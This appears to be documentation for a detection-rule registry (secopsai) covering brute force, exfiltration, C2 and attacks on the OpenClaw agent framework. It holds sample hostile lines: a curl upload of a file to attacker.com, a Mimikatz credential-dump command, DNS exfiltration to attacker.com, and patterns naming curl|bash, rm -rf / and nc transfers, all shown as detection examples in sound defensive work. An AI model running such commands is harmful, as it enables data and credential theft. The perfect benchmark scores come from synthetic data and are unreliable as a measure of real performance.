# Rules Registry

Complete reference for all 12 detection rules in secopsai.

## Overview

The detection pipeline includes rules organized by framework:

| Category     | Rules                | Focus                          |
| ------------ | -------------------- | ------------------------------ |
| **Baseline** | RULE-001 to RULE-007 | General security (T1110-T1218) |
| **OpenClaw** | RULE-101 to RULE-110 | OpenClaw-specific attacks      |

---

## Baseline Rules (RULE-001 to RULE-007)

These rules detect general attack patterns applicable to any system.

### RULE-001: Brute Force (T1110)

**Attack:** Multiple failed authentication attempts

**Pattern:** 10+ failed logins in 5 minute window

**Alert When:**

- Failed SSH login attempts spike
- Rapid password guessing observed
- Account lockout threshold approached

**Example Events:**

```json
{
  "event_type": "auth_failure",
  "username": "admin",
  "source_ip": "192.168.1.100",
  "failure_count": 15,
  "window_minutes": 5
}
```

**Severity:** `HIGH`

**Remediation:** Block source IP, reset compromised account passwords

---

### RULE-002: DNS Exfiltration (T1048.003)

**Attack:** Data exfiltration via DNS queries

**Pattern:** DNS queries with unusual patterns, long query names, binary data in labels

**Alert When:**

- DNS query names contain base64/hex patterns
- Many DNS A/AAAA requests to unique domains
- RFC violations in DNS protocol usage

**Example:**

```
query: 6162636465666768696a6b6c6d6e6f70.attacker.com
(hex-encoded data in subdomain)
```

**Severity:** `CRITICAL` (data loss)

**Remediation:** Review DNS logs, block attacker domain, retrieve exfilt records

---

### RULE-003: C2 Beaconing (T1071)

**Attack:** Command & control beacon traffic

**Pattern:** Periodic HTTP/HTTPS requests to known C2 infrastructure

**Alert When:**

- Regular connections to IOC domains
- Consistent intervals with error handling patterns
- Non-standard User-Agent strings

**Severity:** `CRITICAL` (active compromise)

**Remediation:** Block outbound connections, isolate host, retrieve logs

---

### RULE-004: Lateral Movement (T1021.002)

**Attack:** Horizontal movement via SMB/PsExec

**Pattern:** Remote file execution via \\\\server\\share paths

**Alert When:**

- SMB traffic to internal IPs
- PsExec command execution observed
- Lateral tool execution attempts

**Severity:** `CRITICAL`

**Remediation:** Isolate affected systems, review SMB logs

---

### RULE-005: PowerShell Abuse (T1059.001)

**Attack:** Dangerous PowerShell commands

**Pattern:** Obfuscated PowerShell, Invoke-Webrequest chains, hidden windows

**Alert When:**

- Encoded/obfuscated PowerShell scripts
- Reflective DLL injection patterns
- Script download & execute chains

**Severity:** `HIGH`

**Remediation:** Block PowerShell or constrain App-Locker policies

---

### RULE-006: Privilege Escalation (T1068)

**Attack:** Attempt to gain elevated privileges

**Pattern:** sudo/UAC bypass, kernel exploit, privilege squashing

**Alert When:**

- Failed privilege escalation attempts
- Known CVE exploit patterns
- Unauthorized root command execution

**Severity:** `CRITICAL`

**Remediation:** Apply patches, monitor PAM logs, enable UAC

---

### RULE-007: Fileless LOLBins (T1218)

**Attack:** Living-off-the-land binary abuse

**Pattern:** Legitimate OS binaries used maliciously (certutil, mshta, regsvcs)

**Alert When:**

- LOLBin command execution with suspicious arguments
- Downloading files via certutil/mshta
- Registry manipulation via reg.exe

**Severity:** `HIGH`

**Remediation:** Application whitelisting, behavior-based prevention

---

## OpenClaw Rules (RULE-101 to RULE-110)

These rules detect attacks specific to the OpenClaw agent framework.

### RULE-101: Dangerous Exec (T1059)

**Attack:** Dangerous command patterns in agent execution

**Pattern Matches:**

- `curl | bash` — shell injection
- `ssh root@[host]` — root access
- `scp` to production — artifact theft
- `rm -rf /` — destructive commands
- Bearer tokens in plaintext — credential exposure

**Alert When:**

- Exec surface contains any dangerous pattern
- Command string matches dangerous regex

**Severity:** `CRITICAL`

**Remediation:**

1. Review command authorization
2. Check if tool was approved in agent audit log
3. Inspect surrounding tool invocations for clues

**Test:**

```bash
python generate_openclaw_attack_mix.py --stats  # Generates 2 dangerous_exec events
```

---

### RULE-102: Sensitive Config Change (T1528)

**Attack:** Unauthorized modification of critical OpenClaw settings

**Pattern Matches:**

- `openclaw.json` authentication field mutation
- `tools.exec` capability changes
- `commands.restart` policy modification

**Alert When:**

- Config audit surface shows mutation to protected field
- Tool capability changed outside normal workflow

**Severity:** `CRITICAL`

**Remediation:**

1. Restore from backup
2. Audit who has config write access
3. Enable config signing/approval workflows

**Example Detection:**

```json
{
  "surface": "config",
  "action": "write",
  "changed_paths": ["openclaw.json:.auth"],
  "timestamp": "2026-03-15T14:23:45Z",
  "alert": true
}
```

---

### RULE-103: Skill Source Drift (T1195)

**Attack:** Installing skills from untrusted sources (supply chain risk)

**Pattern Matches:**

- skill_source != "clawhub" (official repository)
- skill_source contains "github.com" with random username
- skill_source contains "random-gist" or URL-like patterns

**Alert When:**

- Skill installed from non-Clawhub origin
- Source changed unexpectedly

**Severity:** `HIGH` (supply chain)

**Remediation:**

1. Review skill source and author
2. Audit skill code for malicious patterns
3. Remove skill or revert to Clawhub version

**Why it matters:** Skills have agent execution privileges; untrusted sources = arbitrary code.

---

### RULE-104: Policy Denial Churn (T1078)

**Attack:** Rapid policy denials suggesting permission brute-forcing

**Pattern:** 3+ denials of same denial type in under 10 minutes

**Examples:**

- 3+ denied ssh attempts → blocked by policy
- 3+ denied tool execution → insufficient capability
- 3+ denied config edits → insufficient auth level

**Alert When:**

- Denial churn window triggers
- Multiple related denials cluster in time

**Severity:** `MEDIUM` (reconnaissance)

**Remediation:**

1. Review what was being attempted
2. Check if user account is compromised
3. Require approval workflows for sensitive operations

---

### RULE-105: Tool Burst Abuse (T1087)

**Attack:** Rapid tool invocation suggesting reconnaissance or enumeration

**Pattern:**

- 5+ tool starts in under 5 minutes
- Plus: 4+ unique tool types OR 3+ mutating operations

**Requires Context (to avoid false positives):**

- severity_hint >= MEDIUM OR
- status = "denied" OR
- exit_code indicating failure

**Examples:**

- read, write, edit, exec, gateway started in sequence → 5 tools
- git, npm, pip all installing packages → 3 mutating

**Alert When:**

- Burst shape detected
- Plus suspicious context

**Severity:** `MEDIUM`

**Remediation:**

1. Review tool chain for legitimate purpose
2. If reconnaissance, review what was discovered
3. Restrict rapid tool access via approval workflows

---

### RULE-106: Pairing Churn Abuse (T1078)

**Attack:** Rapid pairing approval/denial cycles (authentication bypass attempts)

**Pattern:** start → deny → approve cycle in under 10 minutes

**Why it matters:** Attacker cycles approval states to test boundaries

**Alert When:**

- Approval churn cycle detected

**Severity:** `MEDIUM`

**Remediation:**

1. Review who is requesting pairing
2. Check if initial requester had valid reason
3. Increase pairing approval thresholds

---

### RULE-107: Subagent Fanout Abuse (T1104)

**Attack:** Excessive subagent spawning (lateral movement/escalation)

**Pattern:** 3+ child subagents spawned from same requester in under 5 minutes

**Why it matters:** Creates execution parallelism, hard to audit

**Alert When:**

- 3+ subagent spawn events from one parent in narrow window

**Severity:** `HIGH`

**Remediation:**

1. Review subagent spawn justifications
2. Limit concurrent subagent count
3. Require approval for multi-agent workflows

---

### RULE-108: Restart Loop (T1529)

**Attack:** Rapid restart cycles causing denial of service

**Pattern:** 2+ restarts in under 5 minutes

**Requires Context (to avoid false positives):**

- Policy decision = "forced" OR "deny" OR "block" OR
- Status = error-like (timeout, failure) OR
- severity_hint >= MEDIUM

**Why it matters:** Sabotage or forced reboot loop

**Alert When:**

- Restart window detected
- Plus suspicious context

**Severity:** `HIGH`

**Remediation:**

1. Investigate why restart was forced
2. Check for resource exhaustion
3. Limit restart frequency via policy

**Test:**

```bash
python generate_openclaw_attack_mix.py --stats  # Generates 2 restart_loop events
```

---

### RULE-109: Data Exfiltration (T1048)

**Attack:** Data staging and transfer to attacker infrastructure

**Pattern Matches:**

- `curl -F @[file]` — HTTP form upload
- `wget --post-file` — HTTP post
- `rclone copy|sync` to remote storage
- `rsync` to remote host
- `nc` bidirectional transfer
- `tar|zip && curl` — archive chain
- Keywords: "exfil", "exfiltration"

**Alert When:**

- Any exfil pattern detected in exec surface

**Severity:** `CRITICAL` (data loss)

**Remediation:**

1. Identify exfiltration destination
2. Disconnect host from network
3. Preserve logs, analyze data scope
4. Invalidate credentials if data contains secrets

**Example:**

```bash
# Detected by RULE-109
curl -F "data=@sensitive.json" https://attacker.com/upload
```

---

### RULE-110: Malware Presence (T1204)

**Attack:** Known malware tooling indicators in commands or skill sources

**Pattern Matches:**

- `mimikatz` — credential dumping
- `cobalt strike` / `beacon` — C2 framework
- `meterpreter` / `msfvenom` / `metasploit` — exploit framework
- `xmrig` — cryptocurrency miner
- `ransomware` / `encryptor` — ransomware families
- `njrat`, `quasar`, `darkcomet`, `remcos` — RAT families
- `Invoke-Mimikatz`, `sekurlsa::logonpasswords` — PowerShell patterns

**Alert When:**

- Malware keyword or signature detected in command text or skill_source

**Severity:** `CRITICAL`

**Remediation:**

1. Immediate isolation (air-gap)
2. Capture full memory dump
3. Retrieve command and control logs
4. Assess what systems were accessed

**Example:**

```json
{
  "surface": "exec",
  "command": "powershell Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'",
  "matched_pattern": "Invoke-Mimikatz",
  "rule_id": "RULE-110",
  "severity": "CRITICAL"
}
```

---

## How to Tune Rules

### Adjust Thresholds

Edit `detect.py` and modify **window_minutes**, **threshold counts**, or **severity levels**:

```python
def detect_openclaw_tool_burst(events: List[Dict]) -> List[str]:
    threshold = 5           # ← change required tool count
    window_minutes = 5      # ← change time window
    require_risky = True    # ← toggle context requirement
```

### Add New Patterns

Extend regex patterns in any rule:

```python
exfil_patterns = [
    r"(?i)curl\s+.*\s-F\s+.*@",          # existing
    r"(?i)new-object.*webclient",         # add new
]
```

### Create New Rules

Copy a template and add to `DETECTION_RULES` registry:

```python
def detect_custom_rule(events: List[Dict]) -> List[str]:
    """New rule for custom attack pattern"""
    findings = []
    for event in events:
        if suspicious_pattern(event):
            findings.append(event["event_id"])
    return findings

DETECTION_RULES = {
    "RULE-201": detect_custom_rule,  # ← register
    ...
}
```

### Validate Changes

```bash
python generate_openclaw_attack_mix.py --stats
python evaluate.py --labeled data/openclaw/replay/labeled/attack_mix.json --mode benchmark
```

---

## Rule Effectiveness

### By Attack Type

| Attack Type      | Covered By | F1 Score |
| ---------------- | ---------- | -------- |
| Dangerous Exec   | RULE-101   | 1.0      |
| Sensitive Config | RULE-102   | 1.0      |
| Skill Drift      | RULE-103   | 1.0      |
| Policy Denial    | RULE-104   | 1.0      |
| Tool Burst       | RULE-105   | 1.0      |
| Pairing Churn    | RULE-106   | 1.0      |
| Subagent Fanout  | RULE-107   | 1.0      |
| Restart Loop     | RULE-108   | 1.0      |
| Data Exfil       | RULE-109   | 1.0      |
| Malware          | RULE-110   | 1.0      |

### Overall

- **Combined F1:** 1.000000
- **Precision:** 1.000000 (no false positives)
- **Recall:** 1.000000 (no missed attacks)
- **FPR:** 0.000000

---

**Next:** Understand [Benchmark Data](benchmark-data.md) or [Deploy to Production](deployment-guide.md)
